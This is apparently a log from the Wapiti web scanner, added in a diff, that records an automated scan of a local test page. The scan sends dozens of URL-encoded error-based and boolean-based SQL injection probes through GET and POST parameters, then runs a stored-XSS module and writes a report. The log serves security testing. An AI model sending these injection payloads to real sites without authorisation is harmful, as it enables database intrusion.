+2024-03-20 16:55:13.323 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%29%20AND%2026%3D26%20AND%20%2895%3D95 (2)
+2024-03-20 16:55:13.348 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%27%29%20AND%2057%3D129%20AND%20%28%2735%27%3D%2735 (2)
+2024-03-20 16:55:13.375 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%27%29%20AND%2086%3D116%20AND%20%28%2716%27%3D%2716 (2)
+2024-03-20 16:55:13.400 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%27%29%20AND%2063%3D63%20AND%20%28%2756%27%3D%2756 (2)
+2024-03-20 16:55:13.428 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%22%29%20AND%2093%3D171%20AND%20%28%2246%22%3D%2246 (2)
+2024-03-20 16:55:13.460 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%22%29%20AND%2029%3D96%20AND%20%28%2241%22%3D%2241 (2)
+2024-03-20 16:55:13.494 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/directory_traversal_1.php?page=message.txt%22%29%20AND%2094%3D94%20AND%20%28%2229%22%3D%2229 (2)
+2024-03-20 16:55:13.530 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:13.530 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%C2%BF%27%22%28&security_level=2
+2024-03-20 16:55:13.541 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=submit%C2%BF%27%22%28
+2024-03-20 16:55:13.556 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%20AND%2081%3D102%20AND%2022%3D22&security_level=2
+2024-03-20 16:55:13.562 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%27%20AND%2092%3D113%20AND%20%2761%27%3D%2761&security_level=2
+2024-03-20 16:55:13.569 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%22%20AND%2064%3D154%20AND%20%2246%22%3D%2246&security_level=2
+2024-03-20 16:55:13.576 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%29%20AND%2010%3D73%20AND%20%2872%3D72&security_level=2
+2024-03-20 16:55:13.582 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%27%29%20AND%2095%3D146%20AND%20%28%2728%27%3D%2728&security_level=2
+2024-03-20 16:55:13.589 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%22%29%20AND%2015%3D62%20AND%20%28%2275%22%3D%2275&security_level=2
+2024-03-20 16:55:13.596 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%20AND%2096%3D169%20AND%2049%3D49
+2024-03-20 16:55:13.602 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%27%20AND%2025%3D90%20AND%20%2790%27%3D%2790
+2024-03-20 16:55:13.609 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%22%20AND%2082%3D128%20AND%20%2277%22%3D%2277
+2024-03-20 16:55:13.615 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%29%20AND%2037%3D128%20AND%20%2880%3D80
+2024-03-20 16:55:13.622 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%27%29%20AND%2099%3D154%20AND%20%28%2766%27%3D%2766
+2024-03-20 16:55:13.629 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%22%29%20AND%2045%3D63%20AND%20%28%2226%22%3D%2226
+2024-03-20 16:55:13.649 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105
+2024-03-20 16:55:13.649 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%C2%BF%27%22%28&bug=105
+2024-03-20 16:55:13.659 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%C2%BF%27%22%28
+2024-03-20 16:55:13.677 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%20AND%2078%3D121%20AND%2076%3D76&bug=105
+2024-03-20 16:55:13.684 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%27%20AND%2082%3D103%20AND%20%2749%27%3D%2749&bug=105
+2024-03-20 16:55:13.696 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%22%20AND%2019%3D116%20AND%20%2227%22%3D%2227&bug=105
+2024-03-20 16:55:13.709 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%29%20AND%2071%3D148%20AND%20%2899%3D99&bug=105
+2024-03-20 16:55:13.717 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%27%29%20AND%2035%3D76%20AND%20%28%2718%27%3D%2718&bug=105
+2024-03-20 16:55:13.726 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%22%29%20AND%2071%3D105%20AND%20%28%2292%22%3D%2292&bug=105
+2024-03-20 16:55:13.738 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%20AND%2050%3D107%20AND%2097%3D97
+2024-03-20 16:55:13.749 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%20AND%2062%3D73%20AND%2034%3D34
+2024-03-20 16:55:13.763 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%20AND%2023%3D23%20AND%2012%3D12
+2024-03-20 16:55:13.771 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%27%20AND%2025%3D72%20AND%20%2764%27%3D%2764
+2024-03-20 16:55:13.782 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%27%20AND%2051%3D137%20AND%20%2734%27%3D%2734
+2024-03-20 16:55:13.794 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%27%20AND%2068%3D68%20AND%20%2777%27%3D%2777
+2024-03-20 16:55:13.801 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%22%20AND%2081%3D178%20AND%20%2284%22%3D%2284
+2024-03-20 16:55:13.809 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%22%20AND%2061%3D127%20AND%20%2265%22%3D%2265
+2024-03-20 16:55:13.817 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%22%20AND%2046%3D46%20AND%20%2220%22%3D%2220
+2024-03-20 16:55:13.826 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%29%20AND%2073%3D110%20AND%20%2818%3D18
+2024-03-20 16:55:13.834 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%29%20AND%2088%3D117%20AND%20%2816%3D16
+2024-03-20 16:55:13.847 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%29%20AND%2034%3D34%20AND%20%2838%3D38
+2024-03-20 16:55:13.859 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%27%29%20AND%2075%3D169%20AND%20%28%2791%27%3D%2791
+2024-03-20 16:55:13.867 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%27%29%20AND%2020%3D102%20AND%20%28%2789%27%3D%2789
+2024-03-20 16:55:13.880 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%27%29%20AND%2032%3D32%20AND%20%28%2757%27%3D%2757
+2024-03-20 16:55:13.887 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%22%29%20AND%2071%3D129%20AND%20%28%2284%22%3D%2284
+2024-03-20 16:55:13.895 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%22%29%20AND%2031%3D113%20AND%20%28%2236%22%3D%2236
+2024-03-20 16:55:13.902 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%22%29%20AND%2017%3D17%20AND%20%28%2269%22%3D%2269
+2024-03-20 16:55:13.934 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 16:55:13.949 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:13.982 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:14.008 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:14.136 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 16:55:14.165 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//pathtraversal.json/
+2024-03-20 16:55:14.165 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//pathtraversal.json/web_03202024_1655.html with a browser to see this report.
